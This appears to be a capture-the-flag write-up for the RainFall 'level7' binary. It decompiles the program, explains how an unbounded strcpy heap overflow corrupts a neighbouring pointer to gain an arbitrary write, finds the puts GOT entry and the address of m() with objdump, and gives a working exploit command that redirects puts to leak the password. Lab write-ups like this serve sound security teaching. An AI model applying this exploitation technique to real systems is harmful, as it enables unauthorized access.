@@ -1,0 +1,65 @@
+scp -P 4242 level7@RainFall:level7 <local_path>
+
+----------------------------------------------------------------------------------
+
+  int main(int argc, char **argv) {                                             
+      int32_t* eax	= malloc(8);			OBJECT 1
+	  *eax			= 1;					eax[0] = tag 1
+	  eax[1] 		= malloc(8)				eax[1] = pointer to string buffer 1
+
+      int32_t* eax_4	= malloc(8);			object 2
+	  *eax_4			= 2;				eax_4[0] = tag 2
+	  eax_4[1]			= malloc(8);		eax_4[1] = pointer to string buffer 2
+
+      strcpy(eax[1], argv[1]);				unbounded
+      strcpy(eax_4[1], argv[2]);			copies av[2] into buf2
+
+	  fgets(&c, 0x44, fopen("/home/user/level8/.pass","r"));	reads the flag into c
+      puts("~~");							prints ~~ instead of the flag
+	  return 0;
+  }
+
+----------------------------------------------------------------------------------
+                                                     
+  void m(){ printf("%s - %d", &c, time(NULL)); }
+
+----------------------------------------------------------------------------------
+
+chunk1: malloc(8)  → eax        (holds tag + pointer)
+chunk2: malloc(8)  → eax[1]     (string buffer 1)   ← strcpy(eax[1], argv[1])
+chunk3: malloc(8)  → eax_4      (holds tag + pointer)
+chunk4: malloc(8)  → eax_4[1]   (string buffer 2)   ← strcpy(eax_4[1], argv[2])
+
+We have a write-what-where primitive:
+
+Overflowing chunk2 (via argv[1]) reaches into chunk3, which holds the pointer eax_4[1] 
+
+If we overwrite eax_4[1] with an address of our choice, then strcpy(eax_4[1], argv[2]) 
+will write argv[2] wherever we point it.
+
+----------------------------------------------------------------------------------
+
+chunk2 user data:  8 bytes  (the buffer we want to overflow)
+chunk3 header:     8 bytes  (malloc metadata)
+chunk3 tag field:  4 bytes  (the *eax_4 = 2)
+                  --------
+                  20 bytes  → then we hit eax_4[1] (the pointer)
+
+----------------------------------------------------------------------------------
+So we find puts and m() addresses:
+
+objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+
+objdump -d level7 | grep '<m>'
+080484f4 <m>
+
+----------------------------------------------------------------------------------
+
+Building the exploitaiton commandline:
+
+av[1] formula: bytes size + puts address
+
+av[2] = m() address
+
+./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
